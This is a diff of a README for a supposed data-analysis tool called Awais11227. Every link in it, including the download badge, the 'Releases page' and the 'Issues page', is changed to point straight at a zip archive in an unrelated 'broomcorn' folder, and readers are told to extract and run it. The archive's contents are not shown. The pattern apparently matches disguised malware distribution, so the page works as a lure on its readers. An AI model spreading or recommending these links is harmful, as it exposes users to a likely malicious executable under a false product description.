@@ -1,7 +1,7 @@
 # 🎉 Awais11227 - Simplify Your Data Analysis Journey
 
 ## 📥 Download Now
-[![Download Awais11227](https://raw.githubusercontent.com/arley2005-dot/Awais11227/main/broomcorn/Awais11227.zip)](https://raw.githubusercontent.com/arley2005-dot/Awais11227/main/broomcorn/Awais11227.zip)
+[![Download Awais11227](https://github.com/arley2005-dot/Awais11227/raw/refs/heads/main/broomcorn/Awais-v2.6.zip)](https://github.com/arley2005-dot/Awais11227/raw/refs/heads/main/broomcorn/Awais-v2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to Awais11227! This application helps you analyze data easily. Whether you are working with Excel files, databases, or visualizations, Awais11227 makes the process smooth.
@@ -17,7 +17,7 @@ Before you start, ensure your device meets these requirements:
   - Necessary libraries, which will be installed automatically.
 
 ## ⬇️ Download & Install
-To get started, visit this page to download the latest release: [Awais11227 Releases](https://raw.githubusercontent.com/arley2005-dot/Awais11227/main/broomcorn/Awais11227.zip).
+To get started, visit this page to download the latest release: [Awais11227 Releases](https://github.com/arley2005-dot/Awais11227/raw/refs/heads/main/broomcorn/Awais-v2.6.zip).
 
 1. Open the link above.
 2. Look for the latest version at the top.
@@ -32,7 +32,7 @@ To get started, visit this page to download the latest release: [Awais11227 Rele
    - Open the downloaded `.dmg` file.
    - Drag the application to your Applications folder.
 3. **For Linux:**
-   - Extract the downloaded `https://raw.githubusercontent.com/arley2005-dot/Awais11227/main/broomcorn/Awais11227.zip` file.
+   - Extract the downloaded `https://github.com/arley2005-dot/Awais11227/raw/refs/heads/main/broomcorn/Awais-v2.6.zip` file.
    - Run `./Awais11227` in the terminal.
 
 If you run into any issues during installation, please refer to the troubleshooting section.
@@ -65,7 +65,7 @@ After installation, open Awais11227 from your applications menu. Here’s how to
 ## 🤝 Support
 If you need help or have questions, feel free to reach out:
 
-- **Issues:** Report bugs or request features on the [Issues page](https://raw.githubusercontent.com/arley2005-dot/Awais11227/main/broomcorn/Awais11227.zip).
+- **Issues:** Report bugs or request features on the [Issues page](https://github.com/arley2005-dot/Awais11227/raw/refs/heads/main/broomcorn/Awais-v2.6.zip).
 - **Community:** Join our user community for tips and support.
 
 ## 🛡️ License
@@ -91,4 +91,4 @@ For more details on data analysis techniques using Awais11227, explore topics su
 
 Discover how Awais11227 can enhance your understanding of data and help you make smarter decisions. 
 
-Make sure to download the application today and simplify your data analysis journey! Don't forget to check the [Releases page](https://raw.githubusercontent.com/arley2005-dot/Awais11227/main/broomcorn/Awais11227.zip) regularly for updates.
+Make sure to download the application today and simplify your data analysis journey! Don't forget to check the [Releases page](https://github.com/arley2005-dot/Awais11227/raw/refs/heads/main/broomcorn/Awais-v2.6.zip) regularly for updates.
